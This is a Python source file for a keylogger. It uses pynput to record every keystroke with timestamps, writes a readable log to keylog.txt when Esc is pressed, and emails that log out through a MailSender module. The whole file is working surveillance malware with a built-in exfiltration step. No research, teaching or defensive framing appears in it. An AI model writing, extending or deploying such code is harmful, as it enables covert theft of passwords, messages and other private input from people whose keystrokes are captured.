from pynput import keyboard
import os
import logging
from dotenv import load_dotenv
import convertLog 
from PyMailSender import MailSender

log = "";
message_status = 0;

    
class KeyLogger:
    def clear_log(self,log_file_path):
        with open(log_file_path, 'w') as f:
            # Write the log
            pass;
    def __init__(self, log_file_name) -> None:
        base_name = os.path.splitext(log_file_name)[0]
        self.log_file_path = base_name + ".log";
        #create log template
        logging.basicConfig(filename=self.log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s');
        self.clear_log(self.log_file_path)
    
    def on_press(self,key=None):
        global log, message_status
        log = f"{key} pressed\n"
        logging.info(f'Key {key} pressed')
        
        while message_status ==0:
            message_status +=1;
            print("Keylogger is starting...");
        with open("keylog.txt", "a") as f:
            # f.write(log)
            pass
    #conncention when log every key
    def on_release(self,key=None):
        global log
        if key == keyboard.Key.esc:
            with open(self.log_file_path,"r") as file:
                result_of_log = file.read();
                with open('keylog.txt',"w") as file:
                    file.write("-> Logged statement: \n============================\n" + convertLog.convert_to_readable(result_of_log));
            #convert log file
            with open("key.log","r") as file:
                read = file.read();
                result =  convertLog.convert_log(read);
                with open("key.log","w") as file:
                    file.write(result);
            #composite 
            send_e_mail = MailSender('keylog.txt');
            #start sending e-mail
            print("=> Prepared to send e-mail...");
            send_e_mail.send_mail();
            
            print("Readable log: {}".format(convertLog.convert_to_readable(result_of_log)))
            return False
        
    def write_log(self):
        with open("keylog.txt", "w") as f:
            # TODO: Add implementation
            pass;
    def key_capture_and_create_log(self):
        self.write_log(); 
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
    def start_log(self):
        self.key_capture_and_create_log();